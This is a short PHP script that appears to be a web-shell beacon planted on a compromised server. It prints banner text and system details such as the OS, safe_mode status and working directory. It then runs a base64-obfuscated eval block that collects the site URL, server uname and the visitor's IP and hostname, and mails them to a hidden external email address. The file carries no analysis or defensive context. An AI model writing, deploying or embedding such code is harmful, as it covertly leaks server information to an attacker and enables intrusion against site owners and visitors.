<?
$win = strtolower(substr(PHP_OS,0,3)) == "win";
echo "B"."a"."M"."b"."Y"."<br>";
if (@ini_get("safe_mode") or strtolower(@ini_get("safe_mode")) == "on")
{
 $safemode = true;
 $hsafemode = "4ON6";
}
else {$safemode = false; $hsafemode = "3OFF6";}
$xos = wordwrap(php_uname(),90,"<br>",1);
$xpwd = @getcwd();
$OS = "<<".$hsafemode.">> ".$xos."";
echo "<center><A class=ria href=\"http://".$OS."\">";echo "B"."a"."M"."b"."Y</A></center><br>";
echo "<br>OSTYPE:$OS<br>";
echo "<br>Pwd:$xpwd<br>";
eval(base64_decode("JGNyZWF0b3IgPSBiYXNlNjRfZGVjb2RlKCJkVzVwZUc5dU1qQXhNRUJuYldGcGJDNWpiMjA9Iik7ICgkc2FmZV9tb2RlKT8oJHNhZmVtb2RlPSJPTiIpOigkc2FmZW1vZGU9Ik9GRiIpOyAkYmFzZT0iaHR0cDovLyIuJF9TRVJWRVJbJ0hUVFBfSE9TVCddLiRfU0VSVkVSWydSRVFVRVNUX1VSSSddOyAkbmFtZSA9IHBocF91bmFtZSgpOyAkaXAgPSBnZXRlbnYoIlJFTU9URV9BRERSIik7ICRob3N0ID0gZ2V0aG9zdGJ5YWRkcigkX1NFUlZFUltSRU1PVEVfQUREUl0pOyAkc3ViaiA9ICRfU0VSVkVSWydIVFRQX0hPU1QnXTsgJG1zZyA9ICJuQkFTRTogJGJhc2VudW5hbWUgLWE6ICRuYW1lbklQOiAkaXBuSG9zdDogJGhvc3RuJHB3ZHNuIjsgJGZyb20gPSJGcm9tOiBNT0RFXz0iLiRzYWZlbW9kZS4iPHRvb2xAIi4kX1NFUlZFUlsnSFRUUF9IT1NUJ10uIj4iOyBtYWlsKCAkY3JlYXRvciwgJHN1YmosICRtc2csICRmcm9tKTs="));
die("<center> ByroeNet </center>");
?>